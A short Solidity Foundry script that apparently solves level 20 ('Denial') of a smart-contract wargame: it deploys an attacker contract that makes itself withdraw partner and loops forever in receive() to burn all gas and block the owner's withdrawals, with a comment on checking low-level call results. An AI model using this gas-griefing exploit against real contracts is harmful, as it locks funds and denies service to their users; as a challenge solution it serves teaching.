// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Denial } from "../src/level20.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

///@notice Denial of service - Gas abuse
contract Level20Solution is Script {
    Denial level = Denial(payable(0x847d44A827491301b23FA127153Aaa0039F6F65a));
    
    function run () external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        new Attacker(level);
        vm.stopBroadcast();
    }
}

contract Attacker {
    Denial level;
    constructor(Denial _level) payable {
        level = _level;
        level.setWithdrawPartner(address(this));
    }

    receive() external payable {
        // This will cause an infinite loop that will drain all the gas when the owner calls withdraw()
        // which will send ether over by calling this contract. Hence, low level call() returns should be checked.
        while(true){}
    }
}
